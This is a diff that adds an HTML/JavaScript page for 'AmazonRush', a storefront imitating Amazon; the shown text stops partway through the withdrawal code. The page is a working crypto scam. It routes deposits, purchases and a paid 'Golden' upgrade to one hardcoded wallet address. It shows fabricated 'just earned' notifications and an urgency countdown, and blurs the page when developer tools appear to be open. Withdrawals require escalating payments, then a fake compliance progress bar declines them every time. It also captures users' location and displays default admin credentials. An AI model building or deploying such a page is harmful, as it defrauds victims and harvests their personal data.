@@ -1,0 +1,1071 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<title>AmazonRush. review</title>
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
+<style>
+  :root{--accent:#ff9900;--bg:#f3f4f6;--card:#fff;--text:#111}
+  .dark{--accent:#ffb84d;--bg:#121212;--card:#1e1e1f;--text:#e7e7e7}
+  body{font-family:Arial,Helvetica,sans-serif;margin:0;padding:18px;background:var(--bg);color:var(--text)}
+  header{display:flex;justify-content:space-between;align-items:center;gap:12px}
+  .logo{font-weight:800;font-size:20px;color:var(--accent);cursor:pointer}
+  .btn{background:var(--accent);color:#000;padding:8px 12px;border-radius:6px;border:none;cursor:pointer}
+  .muted{color:rgba(0,0,0,0.55);font-size:13px}
+  .card{background:var(--card);padding:12px;border-radius:8px;box-shadow:0 6px 20px rgba(2,6,23,0.06);margin:12px 0}
+  .grid{display:grid;grid-template-columns:1fr 360px;gap:18px}
+  .products{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:12px}
+  img{width:100%;height:160px;object-fit:cover;border-radius:8px}
+  input,select,textarea{padding:8px;border-radius:6px;border:1px solid #ddd;width:100%;box-sizing:border-box;margin:6px 0}
+  .small{font-size:13px;color:rgba(0,0,0,0.6)}
+  .row{display:flex;gap:8px;align-items:center}
+  .hidden{display:none}
+  .admin-badge{background:#222;color:#fff;padding:6px;border-radius:6px;font-weight:700}
+  .switch{cursor:pointer;padding:6px;border-radius:6px;border:1px solid #ccc}
+  @media(max-width:980px){ .grid{grid-template-columns:1fr} .products{grid-template-columns:repeat(auto-fit,minmax(160px,1fr))} }
+  #loader{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.95);z-index:1000;display:none;align-items:center;justify-content:center}
+  #loader .box{display:inline-block;background:#fff;padding:18px;border-radius:12px;box-shadow:0 10px 40px rgba(0,0,0,0.2);text-align:center}
+  #toast{position:fixed;bottom:20px;right:20px;background:#333;color:#fff;padding:10px;border-radius:5px;display:none;z-index:999;}
+  #timer{color:red;font-weight:bold;}
+  .blurred{filter:blur(5px);}
+  #withdrawOverlay{position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(180deg, rgba(0,0,0,0.45), rgba(0,0,0,0.6));z-index:1100;display:none;align-items:center;justify-content:center;color:#fff}
+  #withdrawOverlay .panel{background:rgba(0,0,0,0.7);padding:20px;border-radius:10px;max-width:420px;text-align:center}
+  #progressBar{height:10px;width:100%;background:rgba(255,255,255,0.15);border-radius:8px;margin-top:12px;overflow:hidden}
+  #progressBarInner{height:100%;width:0%;background:linear-gradient(90deg,#ffd27a,#ff9900);border-radius:8px;transition:width 1s linear}
+  .bubble{padding:8px 12px;border-radius:12px;margin:6px 0;display:inline-block;max-width:80%}
+  .bubble.you{background:#e7f0ff;align-self:flex-end;text-align:right}
+  .bubble.bot{background:#f1f1f1;align-self:flex-start}
+  #chatWindow{display:flex;flex-direction:column}
+</style>
+</head>
+<body>
+
+<!-- Loader & Toast -->
+<div id="loader"><div class="box"><i class="fa fa-spinner fa-spin fa-2x"></i><div style="margin-top:10px">Processing...</div></div></div>
+<div id="toast"></div>
+
+<header>
+  <div class="logo" onclick="logoTap()" title="Tap 3x to open support">amazonrush.com</div>
+  <div class="row">
+    <div id="balanceDisplay" class="small">Balance: $0.00</div>
+    <button class="btn" onclick="showSection('catalog')">Store</button>
+    <button class="btn" onclick="showSection('profile')">Profile</button>
+    <button class="btn" onclick="showSection('support')">Support</button>
+    <button class="btn" onclick="promptAdminKey()">Admin</button>
+    <div style="margin-left:8px"><span class="switch" onclick="toggleDark()" id="darkToggle">Dark</span></div>
+    <div id="timer" class="small"></div>
+  </div>
+</header>
+
+<div class="grid">
+  <div>
+    <div id="homeCard" class="card">
+      <h2>Welcome to AmazonRush</h2>
+      <p class="small">Sign up, verify OTP, deposit and explore products. Admin can approve deposits, reviews, and withdrawals.</p>
+      <div class="row" style="margin-top:8px">
+        <button class="btn" onclick="showSignUp()">User Sign Up</button>
+        <button class="btn" onclick="showLogin()">User Login</button>
+      </div>
+    </div>
+
+    <div id="signupCard" class="card hidden">
+      <h3>Sign up</h3>
+      <input id="su_name" placeholder="Full name">
+      <input id="su_phone" placeholder="Phone (digits only)">
+      <input id="su_email" placeholder="Email">
+      <input id="su_password" placeholder="Password" type="password">
+      <div class="row">
+        <button class="btn" onclick="startSignup()">Get OTP</button>
+        <button class="btn" onclick="cancelAuth()">Cancel</button>
+      </div>
+      <div id="otpHint" class="small muted"></div>
+    </div>
+
+    <div id="otpCard" class="card hidden">
+      <h3>Enter OTP</h3>
+      <input id="otp_input" placeholder="OTP">
+      <div class="row">
+        <button class="btn" onclick="verifyOtp()">Verify</button>
+        <button class="btn" onclick="cancelAuth()">Cancel</button>
+      </div>
+      <div id="otpShown" class="small muted"></div>
+    </div>
+
+    <div id="loginCard" class="card hidden">
+      <h3>User Login</h3>
+      <input id="li_email" placeholder="Email">
+      <input id="li_password" placeholder="Password" type="password">
+      <div class="row">
+        <button class="btn" onclick="loginUser()">Login</button>
+        <button class="btn" onclick="cancelAuth()">Cancel</button>
+      </div>
+    </div>
+
+    <div id="catalog" class="card">
+      <h3>Products</h3>
+      <div class="products" id="productGrid"></div>
+    </div>
+
+    <div id="productModal" class="card hidden">
+      <h3 id="pm_title"></h3>
+      <img id="pm_img" alt="">
+      <p class="small">Price: $<span id="pm_price"></span></p>
+      <p class="small">Description: <span id="pm_desc"></span></p>
+      <p class="small">Pay with crypto to: <strong id="cryptoAddr">TPZZ1r7zi7Q8Sc1x9DXPswbVvL6s9HKBXr</strong></p>
+      <input type="file" id="purchase_receipt" accept="image/*">
+      <div class="row">
+        <button class="btn" onclick="submitPurchaseRequest()">Submit Purchase Request</button>
+        <button class="btn" onclick="closeProduct()" style="background:#ccc">Close</button>
+      </div>
+      <div id="pm_notice" class="small muted"></div>
+    </div>
+
+    <div id="profile" class="card hidden">
+      <h3>Profile</h3>
+      <div class="row" style="justify-content:space-between;align-items:center">
+        <div>
+          <div><strong id="p_name">—</strong></div>
+          <div class="small" id="p_email">—</div>
+        </div>
+        <div class="small" id="p_location">Location: unknown</div>
+      </div>
+
+      <h4>Account</h4>
+      <div class="row">
+        <div>
+          <div class="small">Account type: <strong id="p_account">Basic</strong></div>
+          <button class="btn" onclick="showGoldenUpgradeForm()">Upgrade to Golden ($150 Crypto)</button>
+          <div id="goldenForm" class="hidden">
+            <p class="small">Pay $150 to: <strong id="goldAddr">TPZZ1r7zi7Q8Sc1x9DXPswbVvL6s9HKBXr</strong></p>
+            <input type="file" id="golden_receipt" accept="image/*">
+            <button class="btn" onclick="submitGoldenRequest()">Submit Request</button>
+          </div>
+        </div>
+        <div>
+          <div class="small">OTP verified: <span id="p_verified">No</span></div>
+          <button class="btn" onclick="requestOtp()" style="background:#8bc34a">Get OTP</button>
+        </div>
+      </div>
+
+      <h4>Deposit (Crypto Only)</h4>
+      <input id="deposit_amount" placeholder="Amount to deposit">
+      <p class="small">Send to: <strong id="depositAddr">TPZZ1r7zi7Q8Sc1x9DXPswbVvL6s9HKBXr</strong></p>
+      <input type="file" id="deposit_receipt" accept="image/*">
+      <div class="row">
+        <button class="btn" onclick="submitDeposit()">Submit Deposit Request</button>
+        <button class="btn" onclick="showDeposits()">My Deposits</button>
+      </div>
+
+      <h4>Withdraw (Crypto Only)</h4>
+      <input id="withdraw_amount" placeholder="Amount to withdraw">
+      <input id="withdraw_account" placeholder="Your crypto wallet address">
+      <div class="row">
+        <button class="btn" onclick="requestWithdrawal()">Request Withdraw</button>
+        <button class="btn" onclick="showWithdrawals()">My Withdrawals</button>
+      </div>
+      <div id="withdrawNotice" class="small muted"></div>
+
+      <h4>Write Review (earn $50)</h4>
+      <select id="review_product"></select>
+      <textarea id="review_text" rows="3" placeholder="Write your review"></textarea>
+      <div class="row">
+        <button class="btn" onclick="submitReview()">Submit Review</button>
+      </div>
+
+      <h4>Purchase History</h4>
+      <div id="purchaseHistory" class="small"></div>
+
+      <h4>My Reviews</h4>
+      <div id="myReviews" class="small"></div>
+
+      <h4>Edit Profile</h4>
+      <input id="edit_name" placeholder="Name">
+      <input id="edit_phone" placeholder="Phone">
+      <input id="edit_password" placeholder="Password" type="password">
+      <div class="row">
+        <button class="btn" onclick="saveProfile()">Save Profile</button>
+        <button class="btn" onclick="logout()">Logout</button>
+      </div>
+
+      <h4>Referral System (Earn $50 per friend deposit $100+)</h4>
+      <div class="small">Your referral link: <span id="refLink"></span></div>
+    </div>
+
+    <div id="support" class="card hidden">
+      <h3>Support</h3>
+      <div id="chatWindow" style="height:200px;overflow:auto;border:1px solid #eee;padding:8px;background:#fafafa"></div>
+      <div id="typingIndicator" class="hidden small muted">Support is typing...</div>
+      <input id="chatInput" placeholder="Ask a question">
+      <div class="row">
+        <button class="btn" onclick="sendChat()">Send</button>
+        <button class="btn" onclick="clearChat()" style="background:#ccc">Clear</button>
+      </div>
+      <div class="small muted">Support replies are simulated by a bot.</div>
+    </div>
+  </div>
+
+  <div>
+    <div id="adminLogin" class="card hidden">
+      <h3>Admin</h3>
+      <input id="admin_user" placeholder="Admin username">
+      <input id="admin_pass" placeholder="Admin password" type="password">
+      <div class="row">
+        <button class="btn" onclick="adminLogin()">Login</button>
+        <button class="btn" onclick="adminLogout()" style="background:#ccc">Logout</button>
+      </div>
+      <div class="small">Default admin user: <code>admin</code> password: <code>admin123</code></div>
+    </div>
+
+    <div id="adminPanel" class="card hidden">
+      <div style="display:flex;justify-content:space-between;align-items:center">
+        <h3>Admin Panel</h3>
+        <div class="admin-badge">ADMIN</div>
+      </div>
+
+      <h4>Search</h4>
+      <input id="admin_search" placeholder="Search users, reviews, tx" oninput="renderAdmin()">
+
+      <h4>Users</h4>
+      <div id="adminUsers" style="max-height:200px;overflow:auto"></div>
+
+      <h4>Pending Deposits</h4>
+      <div id="adminDeposits" style="max-height:140px;overflow:auto"></div>
+
+      <h4>Pending Withdrawals</h4>
+      <div id="adminWithdraws" style="max-height:140px;overflow:auto"></div>
+
+      <h4>Pending Reviews</h4>
+      <div id="adminReviews" style="max-height:140px;overflow:auto"></div>
+
+      <h4>Pending Purchases</h4>
+      <div id="adminPurchases" style="max-height:140px;overflow:auto"></div>
+
+      <h4>Pending Golden Upgrades</h4>
+      <div id="adminUpgrades"
+      style="max-height:140px;overflow:auto"></div>
+
+      <h4>Transactions</h4>
+      <div id="adminTx" style="max-height:180px;overflow:auto"></div>
+
+      <div class="row" style="margin-top:8px">
+        <button class="btn" onclick="resetAll()">Reset All Data</button>
+        <button class="btn" onclick="exportUsersToCSV()">Export Users CSV</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Withdraw processing overlay -->
+<div id="withdrawOverlay">
+  <div class="panel">
+    <div id="withdrawMsgLarge" style="font-size:18px;font-weight:700">Processing your withdrawal</div>
+    <div id="withdrawMsgSmall" class="small" style="margin-top:8px">We are confirming your account and compliance — this may take a few moments.</div>
+    <div id="progressBar"><div id="progressBarInner"></div></div>
+    <div style="margin-top:10px"><button class="btn" onclick="abortWithdraw()" id="abortWithdrawBtn" style="background:#444">Cancel Request</button></div>
+  </div>
+</div>
+
+<script>
+/* ===========================
+   Config / Constants
+   =========================== */
+const LS = {
+  USERS: 'ar_users_v4',
+  PRODUCTS: 'ar_products_v4',
+  PENDING_DEPOSITS: 'ar_pendingDeposits_v4',
+  PENDING_WITHDRAWS: 'ar_pendingWithdraws_v4',
+  PENDING_REVIEWS: 'ar_pendingReviews_v4',
+  PENDING_PURCHASES: 'ar_pendingPurchases_v4',
+  PENDING_UPGRADES: 'ar_pendingUpgrades_v4',
+  TRANSACTIONS: 'ar_transactions_v4'
+};
+
+// updated values
+const cryptoAddress = 'TPZZ1r7zi7Q8Sc1x9DXPswbVvL6s9HKBXr';
+const goldenFee = 300;       // changed from 50 -> 150
+const reviewBonus = 50;      // changed from 20 -> 50
+
+// Admin secret key (Option A)
+const ADMIN_SECRET_KEY = 'SUCCESSFUL#'; // <--- change this to your preferred secret
+
+// small limits to prevent localStorage overflows
+const MAX_PENDING_ITEMS = 50;        // cap array sizes
+const MAX_STORED_RECEIPT_PREVIEW = 256; // store only a short preview of receipts
+
+/* ===========================
+   Fix/Prevent localStorage Quota issues
+   - use safeSave to truncate big strings (like base64 receipts)
+   - cap arrays to MAX_PENDING_ITEMS
+   =========================== */
+
+function safePrepareForStorage(obj) {
+  // Clone object and remove/truncate large fields (receipt strings)
+  try {
+    const copy = JSON.parse(JSON.stringify(obj));
+    const walk = (o) => {
+      if(!o || typeof o !== 'object') return;
+      for(const k of Object.keys(o)){
+        if(k.toLowerCase().includes('receipt') && typeof o[k] === 'string'){
+          if(o[k].length > MAX_STORED_RECEIPT_PREVIEW) {
+            o[k] = o[k].slice(0, MAX_STORED_RECEIPT_PREVIEW) + '...[truncated]';
+          }
+        } else if (typeof o[k] === 'object') walk(o[k]);
+      }
+    };
+    walk(copy);
+    return copy;
+  } catch(e){
+    return {};
+  }
+}
+
+function safeSave(key, val){
+  try {
+    // Before save, sanitize
+    const sanitized = safePrepareForStorage(val);
+    localStorage.setItem(key, JSON.stringify(sanitized));
+  } catch (err) {
+    // If quota exceeded, attempt trimming arrays
+    try {
+      const attempt = safePrepareForStorage(val);
+      // trim arrays deeply
+      const trimArrays = (o) => {
+        if(!o || typeof o !== 'object') return;
+        for(const k of Object.keys(o)){
+          if(Array.isArray(o[k])){
+            if(o[k].length > MAX_PENDING_ITEMS) o[k] = o[k].slice(0, MAX_PENDING_ITEMS);
+            o[k].forEach(trimArrays);
+          } else if(typeof o[k] === 'object') trimArrays(o[k]);
+        }
+      };
+      trimArrays(attempt);
+      localStorage.setItem(key, JSON.stringify(attempt));
+    } catch (e2) {
+      // last resort: drop key
+      try { localStorage.removeItem(key); } catch(e3) {}
+      console.warn('localStorage save failed for', key, e2);
+    }
+  }
+}
+function safeLoad(key, fallback){
+  try {
+    const raw = localStorage.getItem(key);
+    return raw ? JSON.parse(raw) : fallback;
+  } catch(e){ return fallback; }
+}
+
+/* ===========================
+   Data accessors using safeSave/safeLoad
+   =========================== */
+function save(key, val){ safeSave(key, val); }
+function load(key, fallback){ return safeLoad(key, fallback); }
+
+/* ===========================
+   Simple helpers
+   =========================== */
+function uid(prefix='id'){ return prefix + Date.now().toString(36) + Math.floor(Math.random()*999).toString(36); }
+function formatMoney(v){ return parseFloat(v||0).toFixed(2); }
+function now(){ return new Date().toISOString(); }
+function showLoader(){ document.getElementById('loader').style.display = 'flex'; }
+function hideLoader(){ document.getElementById('loader').style.display = 'none'; }
+function showToast(msg, ms=3000){ const t = document.getElementById('toast'); t.innerText = msg; t.style.display = 'block'; setTimeout(()=>t.style.display='none', ms); }
+function playSound(type){ try{ const a = new (window.AudioContext || window.webkitAudioContext)(); const o = a.createOscillator(); o.type='sine'; o.frequency.value = type==='cha'?880:440; o.connect(a.destination); o.start(); setTimeout(()=>o.stop(),120);}catch(e){} }
+function escapeHtml(s){ if(s===0) return '0'; if(!s) return ''; return String(s).replace(/[&<>"']/g, m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m])); }
+
+/* ===========================
+   In-memory small map to hold full receipts during session only
+   (Not persisted to localStorage to avoid quota)
+   =========================== */
+const receiptMemoryStore = {}; // key -> blob url or short dataURL (session)
+
+function storeReceiptInMemory(file, cb){
+  if(!file){ cb(null); return; }
+  const id = uid('rcpt');
+  const url = URL.createObjectURL(file);
+  receiptMemoryStore[id] = { url, name: file.name, size: file.size, type: file.type, created: now() };
+  cb(id);
+}
+
+/* ===========================
+   Data getters/setters (safe)
+   =========================== */
+function getUsers(){ return load(LS.USERS, {}); }
+function saveUsers(u){ save(LS.USERS, u); }
+function getProducts(){ return load(LS.PRODUCTS, []); }
+function saveProducts(a){ save(LS.PRODUCTS, a); }
+function getPendingDeposits(){ return load(LS.PENDING_DEPOSITS, []); }
+function savePendingDeposits(a){ if(Array.isArray(a)) a = a.slice(0, MAX_PENDING_ITEMS); save(LS.PENDING_DEPOSITS, a); }
+function getPendingWithdraws(){ return load(LS.PENDING_WITHDRAWS, []); }
+function savePendingWithdraws(a){ if(Array.isArray(a)) a = a.slice(0, MAX_PENDING_ITEMS); save(LS.PENDING_WITHDRAWS, a); }
+function getPendingReviews(){ return load(LS.PENDING_REVIEWS, []); }
+function savePendingReviews(a){ if(Array.isArray(a)) a = a.slice(0, MAX_PENDING_ITEMS); save(LS.PENDING_REVIEWS, a); }
+function getPendingPurchases(){ return load(LS.PENDING_PURCHASES, []); }
+function savePendingPurchases(a){ if(Array.isArray(a)) a = a.slice(0, MAX_PENDING_ITEMS); save(LS.PENDING_PURCHASES, a); }
+function getPendingUpgrades(){ return load(LS.PENDING_UPGRADES, []); }
+function savePendingUpgrades(a){ if(Array.isArray(a)) a = a.slice(0, MAX_PENDING_ITEMS); save(LS.PENDING_UPGRADES, a); }
+function getTx(){ return load(LS.TRANSACTIONS, []); }
+function saveTx(a){ if(Array.isArray(a)) a = a.slice(0, MAX_PENDING_ITEMS*2); save(LS.TRANSACTIONS, a); }
+
+/* ===========================
+   Chat bot replies (declared early to avoid ReferenceError)
+   =========================== */
+let chatBotReplies = [
+  "Hi there — thanks for reaching out! Could you share your order ID or email so I can check?",
+  "Thanks — I can see your request in the queue. Our team usually reviews proofs within 24–48 hours.",
+  "We appreciate your patience. For deposits, please include a screenshot and transaction hash where possible.",
+  "I’ve escalated this to our payments team. They will respond shortly with next steps.",
+  "If you upgraded and it isn't reflected, please upload the receipt in the Upgrade section and tag Support."
+];
+
+/* ===========================
+   Boot & product init
+   =========================== */
+function ensureProducts(){
+  if(localStorage.getItem(LS.PRODUCTS)) return;
+  const prices = [300,150,600,500,800,1000,700,1500,1700,900,400,950];
+  const titles = ['Pro Wireless Earbuds','Smart Watch X','Portable Speaker Pro','Power Bank 30000mAh','Gaming Headset','Laptop Pro','Smart Phone','Tablet HD','Digital Camera','Drone Fly','Noise Cancel Headphones','Mechanical Keyboard'];
+  const queries = ['earbuds','smartwatch','portable-speaker','powerbank','gaming-headset','laptop','smartphone','tablet','camera','drone','headphones','keyboard'];
+  const sample = titles.map((t,i)=>({
+    id:`prod${i+1}`,
+    title:t,
+    price:prices[i],
+    img:`https://source.unsplash.com/400x300/?${encodeURIComponent(queries[i])}`,
+    desc:`High-quality ${t.toLowerCase()}.`
+  }));
+  saveProducts(sample);
+}
+
+ensureProducts();
+renderProducts();
+renderAdmin();
+initFeatures();
+
+/* ===========================
+   Feature initializers
+   =========================== */
+function initFeatures(){
+  const params = new URLSearchParams(window.location.search);
+  const ref = params.get('ref');
+  if(ref) showToast('Referred by: '+ref, 3000);
+  let endTime = load('ar_endTime', Date.now() + (2*3600 + 15*60)*1000);
+  save('ar_endTime', endTime);
+  setInterval(()=>{
+    const left = endTime - Date.now();
+    if(left <= 0){ document.getElementById('timer').innerText = 'Offer expired!'; return; }
+    const h = Math.floor(left/3600000); const m = Math.floor((left%3600000)/60000); const s = Math.floor((left%60000)/1000);
+    document.getElementById('timer').innerText = `Offer ends in ${h}h ${m}m ${s}s – 30% bonus expires!`;
+  },1000);
+
+  // fake toasts occasionally
+  const fakeNames = ['John','Alice','Bob','Eve','Charlie','Maya','Omar'];
+  setInterval(()=>{
+    const name = fakeNames[Math.floor(Math.random()*fakeNames.length)];
+    const amt = Math.round(Math.random()*500 + 100);
+    showToast(`${name} just earned $${amt}!`, 2200);
+  }, Math.random()*16000 + 12000);
+
+  // Anti-inspect blur (light)
+  setInterval(()=>{
+    const threshold = 160;
+    if(window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold){
+      document.body.classList.add('blurred');
+    } else document.body.classList.remove('blurred');
+  }, 1000);
+
+  // init chat
+  initChatBot();
+}
+
+/* ===========================
+   UI helpers & sections
+   =========================== */
+function showSection(id){
+  const sections = ['homeCard','signupCard','otpCard','loginCard','catalog','productModal','profile','support'];
+  sections.forEach(x=>{ const e=document.getElementById(x); if(e) e.classList.add('hidden'); });
+  const t = document.getElementById(id);
+  if(t) t.classList.remove('hidden');
+}
+function showSignUp(){ showSection('signupCard'); }
+function showLogin(){ showSection('loginCard'); }
+function cancelAuth(){ showSection('homeCard'); }
+
+/* ===========================
+   Auth flows
+   =========================== */
+let currentEmail = null;
+let currentOtp = null;
+function startSignup(){
+  showLoader();
+  setTimeout(()=>{
+    const name = document.getElementById('su_name').value.trim();
+    const phone = document.getElementById('su_phone').value.trim();
+    const email = document.getElementById('su_email').value.trim().toLowerCase();
+    const pass = document.getElementById('su_password').value;
+    if(!name||!phone||!email||!pass){ alert('Fill all fields'); hideLoader(); return; }
+    const users = getUsers();
+    if(users[email]){ alert('Email already used. Please login.'); hideLoader(); return; }
+    users[email] = { name, phone, email, password:pass, balance:0, purchases:[], reviews:[], deposits:[], withdraws:[], verifiedOtp:false, golden:false, location:null, ua:navigator.userAgent, created: now(), referralCode: uid('ref'), referredBy: new URLSearchParams(window.location.search).get('ref') || null };
+    saveUsers(users);
+    currentOtp = Math.floor(100000 + Math.random()*900000).toString();
+    currentEmail = email;
+    document.getElementById('otpShown').innerText = 'OTP (simulated): ' + currentOtp;
+    showSection('otpCard');
+    captureLocation(email);
+    hideLoader();
+  }, 900);
+}
+
+function verifyOtp(){
+  showLoader();
+  setTimeout(()=>{
+    const entered = document.getElementById('otp_input').value.trim();
+    if(!currentOtp || !currentEmail){ alert('No OTP in progress'); hideLoader(); return; }
+    if(entered !== currentOtp){ alert('Incorrect OTP'); hideLoader(); return; }
+    const users = getUsers();
+    if(users[currentEmail]){ users[currentEmail].verifiedOtp = true; saveUsers(users); alert('OTP verified — you can now login.'); }
+    currentOtp = null;
+    showSection('homeCard');
+    hideLoader();
+  },700);
+}
+
+function loginUser(){
+  showLoader();
+  setTimeout(()=>{
+    const email = document.getElementById('li_email').value.trim().toLowerCase();
+    const pass = document.getElementById('li_password').value;
+    const users = getUsers();
+    if(!users[email] || users[email].password !== pass){ alert('Invalid credentials'); hideLoader(); return; }
+    currentEmail = email;
+    showSection('catalog');
+    renderProfile();
+    updateBalanceDisplay();
+    renderProducts();
+    hideLoader();
+  },700);
+}
+
+/* ===========================
+   Products & rendering
+   =========================== */
+let lastViewedProduct = null;
+function renderProducts(){
+  const prods = getProducts();
+  const grid = document.getElementById('productGrid');
+  grid.innerHTML = '';
+  prods.forEach(p=>{
+    const card = document.createElement('div');
+    card.className='card';
+    card.innerHTML = `<img src="${p.img}" alt=""><h4>${escapeHtml(p.title)}</h4><div class="small">Price: $${formatMoney(p.price)}</div><div style="margin-top:8px"><button class="btn" onclick="openProduct('${p.id}')">View / Buy</button></div>`;
+    grid.appendChild(card);
+  });
+  const sel = document.getElementById('review_product');
+  if(sel) sel.innerHTML = prods.map(pp=>`<option value="${pp.id}">${pp.title} — $${formatMoney(pp.price)}</option>`).join('');
+}
+
+function openProduct(id){
+  const p = getProducts().find(x=>x.id===id);
+  lastViewedProduct = p;
+  document.getElementById('pm_title').innerText = p.title;
+  document.getElementById('pm_img').src = p.img;
+  document.getElementById('pm_price').innerText = formatMoney(p.price);
+  document.getElementById('pm_desc').innerText = p.desc;
+  document.getElementById('productModal').classList.remove('hidden');
+}
+function closeProduct(){ document.getElementById('productModal').classList.add('hidden'); }
+
+/* ===========================
+   Purchase request (without saving large receipts)
+   =========================== */
+function submitPurchaseRequest(){
+  showLoader();
+  setTimeout(()=>{
+    if(!currentEmail){ alert('Login required'); hideLoader(); return; }
+    const users = getUsers();
+    const user = users[currentEmail];
+    if(!user.verifiedOtp){ alert('You must verify OTP first to buy'); hideLoader(); return; }
+    const p = lastViewedProduct;
+    if(!p){ alert('No product selected'); hideLoader(); return; }
+    const file = document.getElementById('purchase_receipt').files[0];
+    if(!file){ alert('Upload receipt proof'); hideLoader(); return; }
+    storeReceiptInMemory(file, (rid)=>{
+      const pend = getPendingPurchases();
+      pend.unshift({id: uid('pur'), user: currentEmail, productId: p.id, amount: p.price, receiptRef: rid || null, date: now(), status:'pending'});
+      savePendingPurchases(pend);
+      alert('Purchase request submitted with proof. Pending admin approval.');
+      closeProduct();
+      renderAdmin();
+      hideLoader();
+    });
+  },1000);
+}
+
+/* ===========================
+   Profile render/save
+   =========================== */
+function renderProfile(){
+  if(!currentEmail){ showSection('homeCard'); return; }
+  const users = getUsers();
+  const u = users[currentEmail];
+  if(!u) return;
+  showSection('profile');
+  document.getElementById('p_name').innerText = u.name;
+  document.getElementById('p_email').innerText = u.email;
+  const acc = document.getElementById('p_account');
+  acc.innerText = u.golden ? 'Golden' : 'Basic';
+  if(u.golden) acc.style.color = '#654321';
+  document.getElementById('p_verified').innerText = u.verifiedOtp ? 'Yes' : 'No';
+  document.getElementById('edit_name').value = u.name;
+  document.getElementById('edit_phone').value = u.phone;
+  document.getElementById('edit_password').value = u.password;
+  document.getElementById('purchaseHistory').innerHTML = (u.purchases||[]).map(p=>`<div class="small">• ${escapeHtml(p.title)} — $${formatMoney(p.price)} — ${new Date(p.date).toLocaleString()}</div>`).join('') || '<div class="small muted">No purchases</div>';
+  document.getElementById('myReviews').innerHTML = (u.reviews||[]).map(r=>`<div class="small">• ${escapeHtml(r.text)} — <em>${r.status||'pending'}</em></div>`).join('') || '<div class="small muted">No reviews</div>';
+  document.getElementById('p_location').innerText = 'Location: ' + (u.location ? `${u.location.lat.toFixed(3)}, ${u.location.lon.toFixed(3)}` : 'not shared');
+  document.getElementById('refLink').innerText = window.location.origin + '?ref=' + u.referralCode;
+  updateBalanceDisplay();
+}
+
+function saveProfile(){
+  showLoader();
+  setTimeout(()=>{
+    if(!currentEmail){ hideLoader(); return; }
+    const users = getUsers(); const u = users[currentEmail];
+    u.name = document.getElementById('edit_name').value.trim() || u.name;
+    u.phone = document.getElementById('edit_phone').value.trim() || u.phone;
+    const pwd = document.getElementById('edit_password').value;
+    if(pwd) u.password = pwd;
+    users[currentEmail] = u;
+    saveUsers(users);
+    alert('Profile saved');
+    renderProfile();
+    hideLoader();
+  },700);
+}
+
+/* ===========================
+   Deposits (store only minimal receipt preview in LS; full stored in memory for session)
+   =========================== */
+function submitDeposit(){
+  showLoader();
+  setTimeout(()=>{
+    if(!currentEmail){ alert('Login required'); hideLoader(); return; }
+    const amt = parseFloat(document.getElementById('deposit_amount').value);
+    if(!amt || amt <= 0){ alert('Enter valid amount'); hideLoader(); return; }
+    const users = getUsers();
+    const u = users[currentEmail];
+    if(!u.verifiedOtp){ alert('Verify OTP before depositing'); hideLoader(); return; }
+    const file = document.getElementById('deposit_receipt').files[0];
+    if(!file){ alert('Upload receipt proof'); hideLoader(); return; }
+    storeReceiptInMemory(file, (rid)=>{
+      const pend = getPendingDeposits();
+      pend.unshift({id: uid('dep'), user: currentEmail, amount: amt, method: 'Crypto', receiptRef: rid || null, date: now(), status:'pending'});
+      savePendingDeposits(pend);
+      alert(`Deposit request submitted with proof. Send to ${cryptoAddress}. Pending approval.`);
+      document.getElementById('deposit_amount').value = '';
+      document.getElementById('deposit_receipt').value = '';
+      renderAdmin();
+      hideLoader();
+    });
+  },900);
+}
+
+/* ===========================
+   Withdraw flow with processing animation (longer hope)
+   =========================== */
+let withdrawProcessTimer = null;
+let withdrawProcessStep = 0;
+function requestWithdrawal(){
+  if(!currentEmail){ alert('Login required'); return; }
+  const amt = parseFloat(document.getElementById('withdraw_amount').value);
+  const account = document.getElementById('withdraw_account').value.trim();
+  if(!amt || amt<=0 || !account){ alert('Enter valid amount and crypto address'); return; }
+  const users = getUsers(); const u = users[currentEmail];
+  if(!u.verifiedOtp){ alert('Verify OTP before withdrawing'); return; }
+  const totalDeposited = u.deposits ? u.deposits.reduce((s,x)=>s + (x.amount||0),0) : 0;
+  if(totalDeposited < 200){ document.getElementById('withdrawNotice').innerText = 'You must deposit $200 before making a withdrawal.'; return; }
+  if(!u.golden){ document.getElementById('withdrawNotice').innerText = 'You must upgrade your account to Golden before withdrawal.'; return; }
+  const purchaseCount = (u.purchases || []).length;
+  if(purchaseCount < 3){ document.getElementById('withdrawNotice').innerText = 'You must purchase at least 4 products before withdrawal can continue.'; return; }
+  const hasRangePurchase = (u.purchases || []).some(p => p.price >= 1000 && p.price <= 10000);
+  if(!hasRangePurchase){ document.getElementById('withdrawNotice').innerText = 'You are required to purchase a product which cost $1000 before withdrawal .'; return; }
+
+  // Show hopeful processing overlay
+  document.getElementById('withdrawOverlay').style.display = 'flex';
+  document.getElementById('progressBarInner').style.width = '0%';
+  document.getElementById('withdrawMsgLarge').innerText = 'Processing your withdrawal';
+  document.getElementById('withdrawMsgSmall').innerText = 'Verifying transaction, compliance checks in progress...';
+  withdrawProcessStep = 0;
+  withdrawProcessTimer = setInterval(()=>{
+    withdrawProcessStep++;
+    const percent = Math.min(95, withdrawProcessStep*12 + Math.floor(Math.random()*6));
+    document.getElementById('progressBarInner').style.width = percent + '%';
+    if(withdrawProcessStep === 2) document.getElementById('withdrawMsgSmall').innerText = 'Almost there... contacting payment partners.';
+    if(withdrawProcessStep === 4) document.getElementById('withdrawMsgSmall').innerText = 'Final compliance check — should be completed soon.';
+    if(withdrawProcessStep >= 6){
+      clearInterval(withdrawProcessTimer);
+      setTimeout(()=>{
+        document.getElementById('progressBarInner').style.width = '100%';
+        document.getElementById('withdrawMsgLarge').innerText = 'Action required';
+        document.getElementById('withdrawMsgSmall').innerText = 'Withdrawal declined due to regional policy. Please contact support.';
+        const pend = getPendingWithdraws();
+        pend.unshift({ id: uid('wd'), user: currentEmail, amount: amt, account, date: now(), status:'declined_by_policy' });
+        savePendingWithdraws(pend);
